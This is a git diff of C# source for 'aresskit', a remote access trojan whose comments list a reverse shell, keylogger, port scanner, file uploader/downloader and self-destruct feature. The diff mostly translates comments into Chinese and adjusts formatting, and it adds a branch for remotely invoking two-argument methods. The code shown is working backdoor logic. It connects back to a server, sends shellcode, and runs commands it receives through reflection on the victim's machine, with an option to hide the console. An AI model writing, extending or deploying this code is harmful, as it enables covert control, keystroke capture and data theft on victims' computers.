@@ -6,12 +6,12 @@ using System.Reflection;
 namespace aresskit
 {
     class Program
-    {   
+    {
         const string server = "localhost"; // Server Hostname or IP Address to connect back to.
         const int port = 9000; // TCP Port to connect back to.
         const bool hideConsole = false; // Show/Hide malicious console on Clients (victims) computer.
         const string cmdSplitter = "::"; // Characters to split Class/Method in command input (ex: Administration::IsAdmin or Administration->IsAdmin)
-        
+
 
         private static void sendBackdoor(string server, int port)
         {
@@ -28,12 +28,12 @@ namespace aresskit
                     stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
                     byte[] data = new byte[256]; byte[] output = Misc.byteCode("");
 
-                    // String to store the response ASCII representation.
+                    // 用於存儲響應ASCII表示的字符串。
 
                     int bytes = stream.Read(data, 0, data.Length);
                     responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                     responseData = responseData.Replace("\n", string.Empty);
-                    
+
                     if (responseData == "cd")
                         System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                     else if (responseData == "exit")
@@ -68,7 +68,7 @@ namespace aresskit
                             }
                             else
                             {
-                                responseData = responseData.Trim(); // To eliminate annoying things in the string
+                                responseData = responseData.Trim(); // 移除開頭結尾空白
 
                                 // Will produce: (clas name), (method name), [arg](,)[arg]...
                                 string[] classMethod = responseData.Split(new[] { cmdSplitter }, StringSplitOptions.None);
@@ -92,6 +92,10 @@ namespace aresskit
                                     if (methodParameters.Length == 0)
                                     {
                                         output = Misc.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
+                                    }
+                                    else if (methodParameters.Length == 2 && methodParameters[0].ParameterType.ToString() == "System.String" && methodParameters[1].ParameterType.ToString() == "System.String")
+                                    {
+                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, new object[] { methodData[1], methodData[2] }).ToString() + "\n");
                                     }
                                     else
                                     {
@@ -133,20 +137,22 @@ namespace aresskit
         {
             // Hide Window
             if (hideConsole)
+            {
                 Toolkit.HideWindow();
-            
+            }
+
             // Fully featured Remote Administration Tool (RAT)
             /*
-             * Aresskit comes equipped with networking tools and administration tools such as:
-             * - Built-In Port Scanner
-             * - Reverse Command Prompt Shell (minimalistic, no auth required)
-             * - UDP/TCP Port Listener (similar to Netcat)
-             * - File downloader/uploader
-             * - Screenshot(s)
-             * - Real-Time and Log-based Keylogger
-             * - Self-destruct feature (protect your privacy)
+             * Aresskit配備了網絡工具和管理工具，例如：
+              * - 內置端口掃描器
+              * - 反向命令提示符殼（簡約，不需要驗證）
+              * - UDP / TCP端口監聽器（類似於Netcat）
+              * - 文件下載/上傳
+              * - - 屏幕截圖
+              * - 實時和基於日誌的鍵盤記錄
+              * - 自毀功能（保護您的隱私）
             */
-            
+
             while (true)
             {
                 if (Network.checkInternetConn("www.google.com") || server == "localhost")
